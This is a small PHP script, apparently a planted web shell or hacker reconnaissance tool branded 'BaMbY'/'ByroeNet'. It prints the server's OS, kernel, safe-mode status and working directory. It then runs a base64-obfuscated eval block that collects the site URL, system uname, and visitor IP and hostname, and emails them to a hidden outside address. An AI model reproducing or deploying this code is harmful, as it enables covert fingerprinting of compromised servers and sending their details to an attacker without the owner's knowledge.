<?
$win = strtolower(substr(PHP_OS,0,3)) == "win";
echo "B"."a"."M"."b"."Y"."<br>";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">";echo "B"."a"."M"."b"."Y</A></center><br>";
echo "<br>OSTYPE:$OS<br>";
echo "<br>Pwd:$xpwd<br>";
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJjMnh2ZDNOcmVVQjVZV2h2Ynk1amIyMD0iKTsKKCRzYWZlX21vZGUpPygkc2FmZW1vZGU9Ik9OIik6KCRzYWZlbW9kZT0iT0ZGIik7CiRiYXNlPSJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107IAokbmFtZSA9IHBocF91bmFtZSgpOwokaXAgPSBnZXRlbnYoIlJFTU9URV9BRERSIik7CiRob3N0ID0gZ2V0aG9zdGJ5YWRkcigkX1NFUlZFUltSRU1PVEVfQUREUl0pOwokc3ViaiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsgCiRtc2cgPSAiXG5CQVNFOiAkYmFzZVxudW5hbWUgLWE6ICRuYW1lXG5JUDogJGlwXG5Ib3N0OiAkaG9zdFxuJHB3ZHNcbiI7CiRmcm9tID0iRnJvbTogTU9ERV89Ii4kc2FmZW1vZGUuIjx0b29sQCIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiI+IjsKbWFpbCggJGNyZWF0b3IsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
die("<center> ByroeNet </center>");
?>